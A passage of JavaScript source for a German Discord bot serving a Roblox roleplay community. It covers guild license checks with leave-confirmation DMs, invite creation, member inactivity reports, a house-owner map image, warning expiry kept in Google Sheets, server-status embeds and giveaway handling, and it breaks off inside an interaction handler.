                // Pfad zur serverconfig.json für die aktuelle Gilde
                const configPath = `/home/ec2-user/SheetsBot-master/src/jsons/${guild.id}/serverconfig.json`;
                
                // Prüfen, ob die Konfigurationsdatei existiert und valid:true ist
                let isValidServer = false;
                try {
                    const config = require(configPath);
                    if (config.valid === true) {
                        isValidServer = true;
                        console.log(`✅ ${guild.name} ist ein valider Server (Überspringen)`);
                    }
                } catch (error) {
                    // Datei existiert nicht oder ist ungültig -> isValidServer bleibt false
                }

                // Wenn der Server valid ist, überspringen
                if (isValidServer) continue;

                const owner = await guild.fetchOwner();
                console.log(`🔍 Überprüfe Gilde: ${guild.name} | Besitzer: ${owner.user.tag} (${owner.id})`);

                // Falls der Besitzer nicht der Ziel-User ist, Bestätigungsnachricht senden
                if (owner.id !== targetUserId) {
                    console.log(`⚠️ Besitzer von ${guild.name} ist nicht ${targetUserId}. Anfrage senden...`);

                    // Einladung erstellen (falls der Bot Berechtigungen hat)
                    let inviteLink = "Keine Einladung möglich";
                    const channels = guild.channels.cache
                        .filter(channel => channel.isText() && channel.permissionsFor(client.user).has("CREATE_INSTANT_INVITE"));

                    if (channels.size > 0) {
                        try {
                            const invite = await channels.first().createInvite({ maxAge: 0, maxUses: 0, unique: true });
                            inviteLink = invite.url;
                        } catch (error) {
                            console.warn(`⚠️ Konnte keine Einladung für ${guild.name} erstellen.`);
                        }
                    }

                    // Bestätigungs-Buttons erstellen
                    const row = new MessageActionRow().addComponents(
                        new MessageButton()
                            .setCustomId(`confirm_leave/${guild.id}`)
                            .setLabel("✅ Ja, verlasse den Server")
                            .setStyle("DANGER"),

                        new MessageButton()
                            .setCustomId(`cancel_leave`)
                            .setLabel("❌ Nein, abbrechen")
                            .setStyle("SUCCESS")
                    );

                    // Nachricht an den spezifischen Benutzer senden
                    try {
                        await targetUser.send({
                            content: `⚠️ **Bestätigung erforderlich:**\nSoll der Bot den Server **"${guild.name}"** verlassen?\n🔗 **Einladung:** ${inviteLink}`,
                            components: [row]
                        });
                        console.log(`📩 Anfrage für ${guild.name} an <@${targetUserId}> gesendet.`);
                    } catch (error) {
                        console.error("❌ Fehler beim Senden der DM:", error);
                    }
                }
            } catch (error) {
                console.error(`❌ Fehler beim Laden des Besitzers von ${guild.name}:`, error);
            }
        }
    } catch (error) {
        console.error("❌ Fehler in checkGuilds:", error);
    }
}

const IGNORE_GUILD_ID = "1075044009875099729"; // ID der Gilde, die ignoriert werden soll
async function createinvite() {
    for (const guild of client.guilds.cache.values()) {
        if (guild.id === IGNORE_GUILD_ID) {
            console.log(`🚫 Überspringe Server: ${guild.name} (${guild.id})`);
            continue;
        }

        try {
            const channels = guild.channels.cache
                .filter(channel => channel.isText() && channel.permissionsFor(client.user).has("CREATE_INSTANT_INVITE"));

            if (!channels.size) {
                console.log(`⚠️ Keine passenden Kanäle in ${guild.name} (${guild.id}) gefunden.`);
                continue;
            }

            const channel = channels.first();
            const invite = await channel.createInvite({ maxAge: 0, maxUses: 0, unique: true });

            checkguilds(guild, invite);
            console.log(`✅ Einladung für ${guild.name}: ${invite.url}`);
            //inviteLinks.push(`**${guild.name}**: ${invite.url}`);

        } catch (error) {
            console.error(`❌ Fehler beim Erstellen einer Einladung für ${guild.name}:`, error);
        }
    }
}



async function readyfunctions() {
    try {
        const aktive = false;
        if(!aktive) return;
        const guild = client.guilds.cache.first(); // Erste Gilde aus dem Cache
        const roleId = "1332238674657808447"; // ID der Zielrolle
        const outputFile = "./src/jsons/members_with_role.json"; // JSON-Datei für exportierte Mitglieder
        const adminChatId = "1325777854042083328"; // Admin-Channel für Warnungen

        console.log("📂 Lade Datei:", outputFile);

        if (!fs.existsSync(outputFile)) {
            console.warn("⚠️ Die Datei members_with_role.json existiert nicht.");
            return;
        }

        const membersinlist = JSON.parse(fs.readFileSync(outputFile, "utf8"));
        if (!Array.isArray(membersinlist)) {
            throw new Error("❌ Fehler: `membersinlist` ist kein Array!");
        }

        const nachrichtenPath = path.join(__dirname, `./jsons/${guild.id}/nachrichten.json`);
        const voiceLogsPath = path.join(__dirname, `./jsons/${guild.id}/voice_logs.json`);
        if (!fs.existsSync(nachrichtenPath) || !fs.existsSync(voiceLogsPath)) {
            console.warn("⚠️ Nachrichten oder Voice-Logs nicht gefunden.");
            return;
        }

        const nachrichten = JSON.parse(fs.readFileSync(nachrichtenPath, "utf8"));
        const voiceLogs = JSON.parse(fs.readFileSync(voiceLogsPath, "utf8"));

        console.log(`📜 Überprüfe letzte Aktivitäten für ${membersinlist.length} Mitglieder...`);

        const threeDaysAgo = Date.now() - 3 * 24 * 60 * 60 * 1000;
        let inactiveUsers = [];

        for (const member of membersinlist) {
            if (!member.id) {
                console.warn(`⚠️ Mitglied ohne ID gefunden:`, member);
                continue;
            }

            let userId = member.id;
            let username = member.username;

            // **Falls der Name eine Rolle enthält (~Admin~ | Name), entferne alles außer der ID**
            if (username.includes("|")) {
                username = username.split("|")[1].trim();
            }

            let lastTextMessage = null;

            // **Durch alle Channels iterieren**
            for (const channel in nachrichten) {
                if (nachrichten.hasOwnProperty(channel)) {
                    const channelMessages = nachrichten[channel];

                    // **Durch alle Nachrichten des Channels iterieren**
                    for (const message of channelMessages) {
                        if (message.user === username) {
                            lastTextMessage = message;
                        }
                    }
                }
            }

            // Falls keine Textnachricht gefunden wurde, setzen wir einen Standardwert
            const lastTextMessageTime = lastTextMessage
                ? new Date(lastTextMessage.uhrzeit)
                : null;

            // **Überprüfe Voice-Logs**
            const lastVoiceActivity = voiceLogs.logs
                .filter(log => log.userId === userId && log.action.includes("Beitritt"))
                .map(log => new Date(log.timestamp))
                .sort((a, b) => b - a)[0] || null; // Neueste Voice-Aktivität holen

            // Entscheide, welche Aktivität später war
            let lastActivityTime = null;
            if (lastVoiceActivity && lastTextMessageTime) {
                lastActivityTime = lastVoiceActivity > lastTextMessageTime ? lastVoiceActivity : lastTextMessageTime;
            } else {
                lastActivityTime = lastTextMessageTime || lastVoiceActivity;
            }

            // **Formatierung der letzten Aktivität**
            let formattedLastActivity = lastActivityTime
                ? lastActivityTime.toLocaleString("de-DE", { timeZone: "Europe/Berlin" })
                : "Unbekannt";

            // **Überprüfung, ob User in den letzten 3 Tagen aktiv war**
            if (!lastActivityTime || lastActivityTime.getTime() < threeDaysAgo) {
                inactiveUsers.push({ userId, username, lastActivityTime: formattedLastActivity });
                console.log(`⚠️ Keine Aktivität für <@${userId}> in den letzten 3 Tagen.`);
            } else {
                console.log(`✅ <@${username}> war zuletzt aktiv am ${formattedLastActivity}`);
            }
        }

        // **Admin-Benachrichtigung für inaktive User**
        if (inactiveUsers.length > 0) {
            const targetChannel = await client.channels.fetch(adminChatId);
            const warningMessage = inactiveUsers
                .map(user => `⚠️ <@${user.userId}> war seit 3 Tagen (${user.lastActivityTime}) nicht aktiv.`)
                .join("\n");

            await targetChannel.send(`**🚨 Inaktive Benutzer:**\n${warningMessage}`);
        }

        console.log("✅ Überprüfung abgeschlossen.");
    } catch (error) {
        console.error("❌ Fehler in `readyfunctions`:", error);
    }
}



function berechneTage(uhrzeit) {
    if (!uhrzeit) return NaN;

    // Versuche das Datum zu parsen
    let parsedDate = parseCustomDate(uhrzeit);
    if (!parsedDate || isNaN(parsedDate)) return NaN; // Falls Datum ungültig ist

    const jetzt = new Date();
    return (jetzt - parsedDate) / (1000 * 60 * 60 * 24);
}

// **Datum von "DD.MM.YYYY, HH:MM:SS" in ein echtes Date-Objekt umwandeln**
function parseCustomDate(dateString) {
    try {
        const regex = /(\d{1,2})\.(\d{1,2})\.(\d{4}), (\d{1,2}):(\d{1,2}):(\d{1,2})/;
        const match = dateString.match(regex);

        if (!match) return NaN;

        const [_, day, month, year, hour, minute, second] = match.map(Number);
        return new Date(year, month - 1, day, hour, minute, second); // JS Monate sind 0-basiert (Jan = 0)
    } catch (error) {
        console.error(`❌ Fehler beim Parsen des Datums: ${dateString}`, error);
        return NaN;
    }
}




function upates(guild)
{
    //console.log(chalk.greenBright("Updates"));
    exportMembersWithRole(guild);
    updateSupportChannelName(guild);
    updateServerInfos();
    updatebotstus();
}

const { createCanvas, loadImage } = require("canvas");

// **Dateipfade**
const housesDataPath = "/home/ec2-user/SheetsBot-master/src/jsons/häuser.json";
const mapImagePath = "/home/ec2-user/SheetsBot-master/images/map.png";
const outputImagePath = "/home/ec2-user/SheetsBot-master/src/img/map_with_owners.png";
const messageIdPath = "/home/ec2-user/SheetsBot-master/src/jsons/map_message.json"; // Speichert die Nachricht mit dem Bild



async function generateHouseMap() {
    try {
        const sendchannel = "1336721920468451560"; // Discord Kanal-ID
        const housesData = JSON.parse(fs.readFileSync(housesDataPath, "utf8"));
        const mapImage = await loadImage(mapImagePath);
        const canvas = createCanvas(mapImage.width, mapImage.height);
        const ctx = canvas.getContext("2d");

        ctx.drawImage(mapImage, 0, 0, mapImage.width, mapImage.height);

        const housePositions = {
            "stadt_häuser": {
                "haus_1": { x: 1035, y: 1017 },
                "haus_2": { x: 925, y: 947 },
                "haus_3": { x: 848, y: 1002 },
                "haus_4": { x: 732, y: 947 },
                "haus_5": { x: 830, y: 915 },
                "haus_6": { x: 919, y: 863 },
                "haus_7": { x: 1117, y: 875 },
                "haus_8": { x: 1083, y: 818 },
                "haus_9": { x: 1119, y: 726 },
                "haus_10": { x: 1111, y: 603 },
                "haus_11": { x: 1024, y: 579 },
                "haus_12": { x: 911, y: 727 },
                "haus_13": { x: 833, y: 753 },
                "haus_14": { x: 821, y: 823 },
                "haus_15": { x: 834, y: 692 },
                "haus_16": { x: 741, y: 634 },
                "haus_17": { x: 937, y: 528 }
            },
            "ausserstadt_häuser": {
                "haus_1": { x: 314, y: 811 },
                "haus_2": { x: 217, y: 765 },
                "haus_3": { x: 305, y: 936 },
                "haus_4": { x: 261, y: 890 },
                "haus_5": { x: 116, y: 809 },
                "haus_6": { x: 117, y: 630 }
            }
        };

        ctx.font = "20px Arial";
        ctx.fillStyle = "#FFD700";
        ctx.textAlign = "center";

        const getrobloxlist = JSON.parse(fs.readFileSync(__dirname + "/jsons/verified.json", "utf8"));

        for (const [category, houses] of Object.entries(housePositions)) {
            for (const [house, position] of Object.entries(houses)) {
                if (housesData[category][house]) {
                    const besitzer = housesData[category][house].besitzer || "Kein Besitzer";
                    let besitzeruser;
                    if (besitzer !== "Kein Besitzer") {
                        besitzeruser = await client.users.fetch(besitzer);
                    }
                    

                    // Nutze den Roblox-Namen aus verified.json
                    // Name aus verified.json nehmen, falls vorhanden
                    let nickname = getrobloxlist[besitzer] || (besitzer === "Kein Besitzer" ? "Kein Besitzer" : besitzeruser?.displayName || "Unbekannt");

                    // Display-Name weiter korrekt aufsplitten und formatieren
                    if (besitzeruser?.displayName.includes("|")) {
                        nickname = besitzeruser?.displayName.split(" | ")[1];
                    } else if (besitzeruser?.displayName.includes("(")) {
                        nickname = besitzeruser?.displayName.split(" (")[0];
                    }

                    // Falls der Name nach dem Splitten noch "|" oder "(" enthält, erneut anpassen
                    if (nickname.includes("|")) {
                        nickname = nickname.split("| ")[1];
                    } else if (nickname.includes(" (")) {
                        if (nickname.split(" (")[0].length < nickname.split(" (")[1].length) {
                            nickname = nickname.split(" (")[0];
                        } else {
                            nickname = "@" + nickname.split(" (")[1].split(")")[0];
                        }
                    }


                    ctx.fillText(nickname, position.x, position.y + 20);
                }
            }
        }

        const buffer = canvas.toBuffer("image/png");
        fs.writeFileSync(outputImagePath, buffer);

    } catch (error) {
        console.error("❌ Fehler beim Generieren der Karte:", error);
    }
}





function updatebotstus()
{
    client.user.setActivity(status[0]);
}

async function checkwarns() {
    try {
        const rows = await client.googleSheets.values.get({
            auth: client.auth,
            spreadsheetId: client.sheetId,
            range: "Tabelle1!A:Z"
        });

        const data = rows.data.values || [];
        const now = moment().tz("Europe/Berlin");
        const cutoffDate = moment.tz("2025-04-05", "YYYY-MM-DD", "Europe/Berlin");

        let removedWarns = [];
        let batchUpdates = [];

        for (let i = 0; i < data.length; i++) {
            const username = data[i][0] || "";
            const lastWarnDateStr = data[i][5] || "";
            let currentWarnCount = parseInt(data[i][1] || "0", 10);

            if (!lastWarnDateStr || currentWarnCount <= 0) continue;

            const lastWarnDate = moment.tz(lastWarnDateStr, "DD.MM.YYYY HH:mm:ss", "Europe/Berlin");

            if (!lastWarnDate.isValid()) continue;

            // Entscheide ob 3 Wochen oder 3 Monate
            const expiryDate = lastWarnDate.isSameOrAfter(cutoffDate)
                ? lastWarnDate.clone().add(3, "weeks")
                : lastWarnDate.clone().add(3, "months");

            if (now.isAfter(expiryDate)) {
                console.log(`⏳ Warn von ${username} ist abgelaufen (${lastWarnDate.format("YYYY-MM-DD HH:mm")})`);

                currentWarnCount--;

                if (currentWarnCount <= 0) {
                    batchUpdates.push({
                        range: `Tabelle1!A${i + 1}:Z${i + 1}`,
                        values: [["", "", "", "", "", ""]]
                    });
                } else {
                    batchUpdates.push({
                        range: `Tabelle1!B${i + 1}`,
                        values: [[currentWarnCount]]
                    });
                    batchUpdates.push({
                        range: `Tabelle1!F${i + 1}`,
                        values: [[now.format("DD.MM.YYYY HH:mm:ss")]]
                    });
                }

                removedWarns.push(username);
            }
        }

        if (batchUpdates.length > 0) {
            removedWarns = removedWarns.filter(user => user && user.trim() !== "");

            await client.googleSheets.values.batchUpdate({
                auth: client.auth,
                spreadsheetId: client.sheetId,
                resource: {
                    valueInputOption: "USER_ENTERED",
                    data: batchUpdates
                }
            });

            const channel = await client.channels.fetch("1319999978399203399");

            const oldMessages = await channel.messages.fetch({ limit: 100 });
            for (const user of removedWarns) {
                const botMessage = oldMessages.find(msg => msg.author.id === client.user.id && msg.content.includes(user));
                if (botMessage) {
                    await botMessage.delete();
                }
            }

            console.log(`✅ Entfernte 1 Warn pro User: ${removedWarns.join(", ")}`);
        } else {
            console.log("📌 Keine Warns waren abgelaufen.");
        }

    } catch (error) {
        console.error("❌ Fehler beim Überprüfen der Warns:", error);
    }
}



const CHANNEL_ID = "1342086360244293632"; // Discord-Channel-ID
const SERVER_NAME_KEYWORD = "star";
let sendwarning = false;


async function updateServerInfos() {
    try {
        const response = await fetch("https://api.emergency-hamburg.com/public/servers");
        if (!response.ok) throw new Error(`Failed to fetch servers: ${response.status}`);

        const servers = await response.json();
        let server = servers.find(s => s.serverName.toLowerCase().includes(SERVER_NAME_KEYWORD));
        const lastserver = getLatestServer(servers);

        const robloxUserIds = [3832862299, 7737721417, 7737771457, 7737759956, 7738291079, 7738255923, 8013496462, 7744112600]
        const usernumber = await checkMultipleUsers(robloxUserIds)

        // **Fallback-Daten setzen, falls kein passender Server gefunden wird**
        if (!server || server.ownerName !== "Emil98d") {
            let playercount
            if (usernumber === 0) {
                playercount = 0;
                //console.log("Server keine spieler");
            }else
            {
                playercount = lastserver.currentPlayers - 1;
                //console.log(`Server hat ${playercount} Spieler.`);
            }
            //console.log(`Kein Server mit '${SERVER_NAME_KEYWORD}' im Namen gefunden. Nutze Fallback-Daten.`);
            server = {
                ownerName: "Emil98d",
                serverDescription: "----Code: 58ww31kw----\r\nStarRP - Ein deutscher VoiceChat RP Server\r\n\r\n⭐ Willkommen auf StarRP! ⭐\r\nErlebe spannende Abenteuer in einer deutschen Hardcore-RP-Welt! Lerne interessante Charaktere kennen und werde Teil einer lebendigen Community.\r\n\r\n🎮 Was wir bieten:\r\n\r\n    Gutes RP: Tolle Rollenspiel-Erlebnisse.\r\n    Netter Support: Wir helfen dir gerne.\r\n    Spielspaß: Jede Menge spannende Geschichten.\r\n\r\n📜 Unsere Regeln:\r\n\r\n    🎤 Voice Chat ist Pflicht!\r\n    🤝 Sei respektvoll zu anderen.\r\n    ✅ Bleibe immer im Charakter.\r\n    🔞 Mindestalter: 12 Jahre.\r\n    🚫 Kein Geld-Farming erlaubt!\r\n\r\nAlle weiten Regeln stehen auf dem dizzy server.\r\n\r\n🌍 Safezones: Die Straßen beim PD (Polizei), bei der Feuerwehr und beim Krankenhaus.\r\n\r\nWir freuen uns, dich bei uns willkommen zu heißen und gemeinsam unvergessliche Abenteuer zu erleben! 🌍\r\n\r\nAlle infos findest du auf starrp.de",
                currentPlayers: playercount,
                maxPlayers: 42,
                privateServerId: "58ww31kw"
            };
        }

        const alarmchannel = await client.channels.fetch("1336030502825496617");
        if (!alarmchannel) return console.error("Channel nicht gefunden.");

        const { getRobloxDisplayName } = require(path.join(__dirname, "./getrobloxname"));
		const robloxname = await getRobloxDisplayName(server.ownerName || "Emil98d");        

        let status = server.currentPlayers < server.maxPlayers ? "🟢 Online" : "🔴 Voll"

        

        if (server.currentPlayers === 0) {
            //console.log("Server nicht in der Webliste");
            //status = "🟡 Nicht in [Webliste](https://de.anotepad.com/note/read/dd8gxm9q)";
            status = "🔴 Offline"
        }

        // überprüfe ob der server owner wirklich Emil98d ist und wenn nicht allamiere die admins
        if (server.ownerName !== "Emil98d" && sendwarning === false) {
            const okserverf = ["STAR_FAMILY2", "🇵🇱Star rp🇵🇱"];
            console.warn("Server-Owner ist nicht Emil98d. Aktualisiere Server-Owner. ", server.serverName);
            const embed = new MessageEmbed()
                .setTitle(`Server Infos: ${server.serverName}`)
                .setColor("#590860")
                .setDescription("Server Informationen von StarRP")
                .addField("Owner", `${robloxname} (${server.ownerName})`, true)
                .addField("Beschreibung", server.serverDescription.substring(0, 1024) || "Keine Beschreibung", false)
                .addField("Spieler", `${server.currentPlayers}/${server.maxPlayers}`, true)
                .addField("Privarte Server-ID", server.privateServerId, true)
                .addField("Status", status, true)
                .setImage('https://i.imgur.com/CnwwYET.png')
                .setTimestamp()
                .setFooter("Server Info von Emergency Hamburg");

            sendwarning = true;
            

            const lowerCaseArray = okserverf.map(item => item.toLowerCase());

            if (!lowerCaseArray.includes(server.serverName.toLowerCase())) {
                alarmchannel.send({content: `🛑 An alle <@&1319999181254823936> ein user hat seinen server Etwas mit StarRP gennant: ${server.serverName}`, embeds: [embed]});
            }
            
            
            server = {
                ownerName: "Emil98d",
                serverDescription: "----Code: 58ww31kw----\r\nStarRP - Ein deutscher VoiceChat RP Server\r\n\r\n⭐ Willkommen auf StarRP! ⭐\r\nErlebe spannende Abenteuer in einer deutschen Hardcore-RP-Welt! Lerne interessante Charaktere kennen und werde Teil einer lebendigen Community.\r\n\r\n🎮 Was wir bieten:\r\n\r\n    Gutes RP: Tolle Rollenspiel-Erlebnisse.\r\n    Netter Support: Wir helfen dir gerne.\r\n    Spielspaß: Jede Menge spannende Geschichten.\r\n\r\n📜 Unsere Regeln:\r\n\r\n    🎤 Voice Chat ist Pflicht!\r\n    🤝 Sei respektvoll zu anderen.\r\n    ✅ Bleibe immer im Charakter.\r\n    🔞 Mindestalter: 12 Jahre.\r\n    🚫 Kein Geld-Farming erlaubt!\r\n\r\nAlle weiten Regeln stehen auf dem dizzy server.\r\n\r\n🌍 Safezones: Die Straßen beim PD (Polizei), bei der Feuerwehr und beim Krankenhaus.\r\n\r\nWir freuen uns, dich bei uns willkommen zu heißen und gemeinsam unvergessliche Abenteuer zu erleben! 🌍\r\n\r\nAlle infos findest du auf starrp.de",
                currentPlayers: 0,
                maxPlayers: 42,
                privateServerId: "58ww31kw"
            };
            
        }
        // **Überprüfe ob der Channel bereits existiert und erstellt ihn falls nicht**

        const channel = await client.channels.fetch(CHANNEL_ID);
        if (!channel) return console.error("Channel nicht gefunden.");

        const embed = new MessageEmbed()
            .setTitle(`Server Infos: ${server.serverName || "StarRP"}`)
            .setColor("#590860")
            .setDescription("Server Informationen von StarRP")
            .addField("Owner", `${robloxname} (${server.ownerName})`, true)
            .addField("Beschreibung", server.serverDescription.substring(0, 1024) || "Keine Beschreibung", false)
            .addField("Spieler", `${server.currentPlayers}/${server.maxPlayers}`, true)
            .addField("Server-ID", "58ww31kw", true)
            .addField("Status", status, true)
            .setImage('https://i.imgur.com/CnwwYET.png')
            .setTimestamp()
            .setFooter("Server Info von Emergency Hamburg");

        // **Letzte Bot-Nachricht im Channel suchen und updaten**
        const messages = await channel.messages.fetch({ limit: 10 });
        const botMessage = messages.find(msg => msg.author.id === client.user.id);

        if (botMessage) {
            await botMessage.edit({ embeds: [embed] });
            //console.log("Nachricht aktualisiert!");
        } else {
            await channel.send({ embeds: [embed] });
            //console.log("Neue Nachricht gesendet!");
        }
    } catch (error) {
        console.error("Fehler beim Abrufen der Server-Daten:", error.message);
    }
}

function getLatestServer(servers) {
    if (!servers || servers.length === 0) return null;

    // Finde den Server mit der höchsten `serverCreationTime`
    const latestServer = servers.reduce((latest, server) =>
        server.currentPlayers < latest.currentPlayers ? server : latest
    );

    return latestServer;
}

const fetch = require("node-fetch");

/**
 * Prüft, ob mehrere Roblox-User in einem Erlebnis sind.
 * @param {number[]} userIds Array mit Roblox-User-IDs
 */
async function checkMultipleUsers(userIds) {
    const url = `https://presence.roblox.com/v1/presence/users`;

    try {
        const response = await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ userIds: userIds })
        });

        const data = await response.json();
        const results = data.userPresences.map((user, index) => ({
            number: index + 1,
            userId: user.userId,
            username: user.lastLocation,
            isInGame: user.userPresenceType === 2,
        }));

        const usersInGame = results.filter(user => user.isInGame);
        const totalUsersInGame = usersInGame.length;
        //console.log(usersInGame);


        //console.log(`Insgesamt sind ${totalUsersInGame} User in einem Erlebnis.`);

        return totalUsersInGame;
    } catch (error) {
        console.error("❌ Fehler beim Abrufen des Online-Status:", error);
        return 0;
    }
}



//#region giveaway
const giveawayJsonPath = path.join(__dirname, './jsons/giveaways.json');

async function checkGiveawayEnd() {
    client.guilds.cache.forEach(async guild => {
        const giveawaysJsonPath = path.join(__dirname, `./jsons/${guild.id}/giveaways.json`);
        if (!fs.existsSync(giveawaysJsonPath)) return;
        console.log("Schaue ob givaway");

        const giveaways = JSON.parse(fs.readFileSync(giveawaysJsonPath, 'utf-8'));
        const activeGiveaway = giveaways.activeGiveaway;

        if (!activeGiveaway) return;

        const remainingTime = activeGiveaway.endsAt - Date.now();
        console.log(`Gesamte Zeit: ${remainingTime}ms`);

        if (remainingTime <= 0 && activeGiveaway.hasended === false) {
            await endGiveaway(guild);
        }
        return
    });
    
}



async function endGiveaway(guild) {
    const giveawaysJsonPath = path.join(__dirname, `./jsons/${guild.id}/giveaways.json`);
    const giveaways = JSON.parse(fs.readFileSync(giveawaysJsonPath, 'utf-8'));
    
    const activeGiveaway = giveaways.activeGiveaway;
    if (!activeGiveaway) return;

    //delete giveaways.activeGiveaway;
    console.log('Ende Giveaway');
    activeGiveaway.hasended = true;
    
    fs.writeFileSync(giveawaysJsonPath, JSON.stringify(giveaways, null, 4));

    const giveawayChannel = await client.channels.fetch('1340974678398992430');
    const message = await giveawayChannel.messages.fetch(activeGiveaway.messageId);

    const participants = activeGiveaway.participants || [];
    const winnerId = participants.length > 0 ? participants[Math.floor(Math.random() * participants.length)] : null;
    const winner = winnerId ? `<@${winnerId}>` : "Keine Teilnehmer";
    //const winner = participants.length > 0 ? `<@${participants[Math.floor(Math.random() * participants.length)]}>` : 'Keine Teilnehmer';

    const participantsText = activeGiveaway.participants.map(id => `<@${id}>`).join(', ') || "Keine Teilnehmer";

    const embed = new MessageEmbed()
        .setTitle(`🎉 Giveaway: ${activeGiveaway.name} beendet`)
        .setDescription(`Giveaway beendet\n\n**Endete:** <t:${activeGiveaway.endsAtTimestamp}:R> (<t:${activeGiveaway.endsAtTimestamp}:F>)\n**Teilnehmer:** \`${activeGiveaway.participants.length}\` - ||${participantsText}||\n**Preis:** ${activeGiveaway.priceAmount} ${activeGiveaway.pricetype}\n**Gewinner:** ${winner}`)
        .setColor('#ff0000')
        .setImage('https://i.imgur.com/CnwwYET.png' );

    await message.edit({
        content: `||<@&1355508021262024714>||\n🎉 **Giveaway beendet!** 🎉\n**Gewinner:** ${winner}`,
        embeds: [embed],
        components: [],
    });

    if (winnerId) {
        try {
            const winnerUser = await client.users.fetch(winnerId);
            await winnerUser.send({
                content: `🎉 **Glückwunsch ${winner}!** 🎉\nDu bist der Gewinner des Giveaways!\n**Preis:** ${activeGiveaway.priceAmount} ${activeGiveaway.pricetype}\nBitte öffne ein Ticket in <#1320005835073781801> in der Kategorie \`Support\` und als Grund \`Anholen des Gewinnes\`.`
            });
        } catch (error) {
            console.error("Fehler beim Senden der Gewinnernachricht:", error);
        }
    }

    delete giveaways.activeGiveaway;
    fs.writeFileSync(giveawaysJsonPath, JSON.stringify(giveaways, null, 4));
}

async function isonserver() {
    client.guilds.cache.forEach(async guild => {
        try {
            const giveawaysJsonPath = path.join(__dirname, `./jsons/${guild.id}/giveaways.json`);
            if (!fs.existsSync(giveawaysJsonPath)) return;
    
            let giveaways = JSON.parse(fs.readFileSync(giveawaysJsonPath, 'utf-8'));
            let activeGiveaway = giveaways.activeGiveaway;
    
            if (!activeGiveaway) return;
    
            let participants = activeGiveaway.participants || [];
            //const guild = client.guilds.cache.first();
            if (!guild) return console.log("❌ Fehler: Bot ist in keiner Guild.");
    
            let updatedParticipants = [];
    
            for (const userid of participants) {
                try {
                    // **✅ Überprüfen, ob User noch auf dem Server ist**
                    await guild.members.fetch(userid);
                    updatedParticipants.push(userid);
                } catch (error) {
                    // **❌ User existiert nicht mehr → Entferne ihn**
                    console.log(`❌ User ${userid} hat den Server verlassen. Entferne aus Giveaway.`);
                }
            }
    
            // **📝 JSON aktualisieren & speichern**
            giveaways.activeGiveaway.participants = updatedParticipants;
            fs.writeFileSync(giveawaysJsonPath, JSON.stringify(giveaways, null, 4));
    
            // **🔄 Falls es noch Teilnehmer gibt, aktualisiere die Nachricht**
            if (updatedParticipants.length > 0) {
                const participantsText = updatedParticipants.map(id => `<@${id}>`).join(', ') || "Keine Teilnehmer";
                const embed = new MessageEmbed()
                    .setTitle(`🎉 Giveaway: ${activeGiveaway.name}`)
                    .setDescription(`**Preis:** ${activeGiveaway.priceAmount} ${activeGiveaway.pricetype}\n**Teilnehmer:** \`${updatedParticipants.length}\` - ||${participantsText}||\n**Endet in:** <t:${activeGiveaway.endsAtTimestamp}:R> (<t:${activeGiveaway.endsAtTimestamp}:F>)\nDrücke den Button, um teilzunehmen!`)
                    .setColor('#00ff00')
                    .setImage('https://i.imgur.com/CnwwYET.png');
    
                try {
                    const giveawayChannel = await client.channels.fetch('1340974678398992430');
                    if (!giveawayChannel) return console.log("❌ Giveaway-Channel nicht gefunden.");
    
                    const message = await giveawayChannel.messages.fetch(activeGiveaway.messageId);
                    if (!message) return console.log("❌ Giveaway-Nachricht nicht gefunden.");
    
                    await message.edit({ embeds: [embed] });
                    console.log("✅ Giveaway-Embed erfolgreich aktualisiert.");
                } catch (error) {
                    console.error("❌ Fehler beim Aktualisieren des Giveaway-Embeds:", error);
                }
            }
    
        } catch (error) {
            console.error("❌ Fehler beim Verarbeiten des verlassenden Mitglieds:", error);
        }
    });
}

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isModalSubmit() && !interaction.isButton()) return;
    if (!interaction.isModalSubmit() && !interaction.customId.startsWith('giveaway_') || !interaction.isButton() && !interaction.customId.startsWith('giveaway_') ) return;
    if (!interaction.customId.startsWith('giveaway_')) return;
    const giveawaysJsonPath = path.join(__dirname, `./jsons/${interaction.guild.id}/giveaways.json`);
    if (!fs.existsSync(giveawaysJsonPath)) return;
    if (interaction.isModalSubmit() && interaction.customId.startsWith('giveaway_create_')) {
        const name = interaction.customId.replace('giveaway_create_', '');
        const priceAmount = interaction.fields.getTextInputValue('price_amount');
        const pricetype = interaction.fields.getTextInputValue('price_type');
        const timeDuration = parseInt(interaction.fields.getTextInputValue('time_duration')) * 60 * 60 * 1000;

        const endsAtTimestamp = Math.floor((Date.now() + timeDuration) / 1000); // Discord Timestamp

        const embed = new MessageEmbed()
            .setTitle(`🎉 Giveaway: ${name}`)
            .setDescription(`**Preis:** ${priceAmount} ${pricetype}\n**Teilnehmer:** \`0\` \n**Endet in:** <t:${endsAtTimestamp}:R> (<t:${endsAtTimestamp}:F>)\nDrücke den Button, um teilzunehmen!`)
            .setColor('#00ff00')
            .setImage('https://i.imgur.com/CnwwYET.png' );

        const row = new MessageActionRow().addComponents(
            new MessageButton()
                .setCustomId(`giveaway_join_${name}`)
                .setLabel('Teilnehmen')
                .setStyle('SUCCESS')
        );

        const giveawayChannel = await client.channels.fetch('1340974678398992430');

        

        // Altes Giveaway löschen, falls vorhanden
        const giveaways = fs.existsSync(giveawaysJsonPath)
            ? JSON.parse(fs.readFileSync(giveawaysJsonPath, 'utf-8'))
            : {};

        if (giveaways.activeGiveaway && giveaways.activeGiveaway.messageId) {
            try {
                const oldMessage = await giveawayChannel.messages.fetch(giveaways.activeGiveaway.messageId);
                await oldMessage.delete();
                console.log('Alte Giveaway-Nachricht wurde gelöscht.');
            } catch (error) {
                console.warn('Alte Giveaway-Nachricht konnte nicht gefunden/gelöscht werden:', error.message);
            }
        }

        const message = await giveawayChannel.send({
            content: "🎁 <@&1355508021262024714> ein Neues Giveaway hat gestartet",
            embeds: [embed],
            components: [row]
        });

        giveaways.activeGiveaway = {
            name,
            priceAmount,
            pricetype,
            messageId: message.id,
            endsAt: Date.now() + timeDuration,
            endsAtTimestamp,
            duration: interaction.fields.getTextInputValue('time_duration'),
            hasended: false,
            participants: [],
        };

        fs.writeFileSync(giveawaysJsonPath, JSON.stringify(giveaways, null, 4));

        await interaction.reply({ content: `✅ Giveaway **${name}** gestartet.`, ephemeral: true });

        checkGiveawayEnd(client);
    }

    if (interaction.isButton() && interaction.customId.startsWith('giveaway_join_')) {
        await interaction.deferUpdate(); // Verhindert "Interaktion fehlgeschlagen"
        const giveaways = JSON.parse(fs.readFileSync(giveawaysJsonPath, 'utf-8'));
        const activeGiveaway = giveaways.activeGiveaway;

        if (!activeGiveaway) {
